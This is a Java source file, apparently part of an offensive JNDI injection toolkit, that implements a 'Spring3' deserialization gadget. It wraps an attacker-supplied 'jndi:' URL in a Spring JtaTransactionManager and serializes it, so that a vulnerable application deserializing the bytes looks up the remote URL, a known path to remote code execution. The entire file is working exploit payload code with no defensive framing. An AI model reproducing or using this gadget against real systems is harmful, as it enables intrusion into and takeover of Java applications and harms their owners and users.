package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import org.springframework.transaction.jta.JtaTransactionManager;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;

public class Spring3 implements ObjectPayload<Object>{
    @Override
    public byte[] getBytes(PayloadType type, String... param) throws Exception {
        String command = param[0];
        String jndiURL = null;
        if (command.toLowerCase().startsWith("jndi:")) {
            jndiURL = command.substring(5);
        } else {
            throw new Exception(String.format("Command [%s] not supported", command));
        }

        JtaTransactionManager manager = new JtaTransactionManager();
        manager.setUserTransactionName(jndiURL);

        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(manager);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }

    @Override
    public Object getObject(String command) throws Exception {
        return null;
    }
}
